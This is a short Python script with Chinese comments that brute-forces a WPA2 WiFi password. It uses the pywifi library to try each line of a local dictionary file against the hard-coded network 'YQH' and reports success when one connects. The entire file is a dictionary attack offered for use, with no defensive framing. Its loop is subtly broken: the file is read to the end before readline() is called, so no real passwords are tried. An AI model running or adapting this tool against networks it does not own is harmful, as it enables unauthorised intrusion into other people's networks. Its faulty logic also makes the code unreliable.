#要想将这些结果全部试完得9.6年
import pywifi
from pywifi import const  # 判断是否连接WIFI
import time
from tqdm import tqdm
import threading


# 测试连接
def WifiConnect(password):
    # 抓取网路接口
    wifi = pywifi.PyWiFi()
    # 获取第一个无线网卡
    ifaces = wifi.interfaces()[0]
    # print(ifaces)
    # 获取电脑无线网卡的名字
    # print(ifaces.name())
    # 断开所有连接
    ifaces.disconnect()
    time.sleep(1)
    wifistatus = ifaces.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        # 创建WiFi连接文件
        profile = pywifi.Profile()
        # 要连接的WiFi的名称
        profile.ssid = 'YQH'
        # 调用密码
        profile.key = password
        # wifi加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 开放网卡
        profile.auth = const.AUTH_ALG_OPEN
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 删除所有连接过的WIFI文件
        ifaces.remove_all_network_profiles()
        # 设定新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        # 连接WIFI
        ifaces.connect(tep_profile)
        # Wifi连接时间
        time.sleep(2)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print('已有wifi连接')


# 读取密码本
def readPassword():
    print('开始破解')
    # 密码本路径
    path = r'D:\jikefeng密码字典\jikefeng.txt'
    # 打开文件
    with open(path, 'r')as f:
        length = len(f.readlines())
        for i in tqdm(range(length)):
            try:
                # 一行一行读取
                password = f.readline()
                bool = WifiConnect(password)
                if bool:
                    print("密码已经破解!")
                    print('密码是{}'.format(password))
                    break
            except:
                continue


if __name__ == '__main__':
    readPassword()
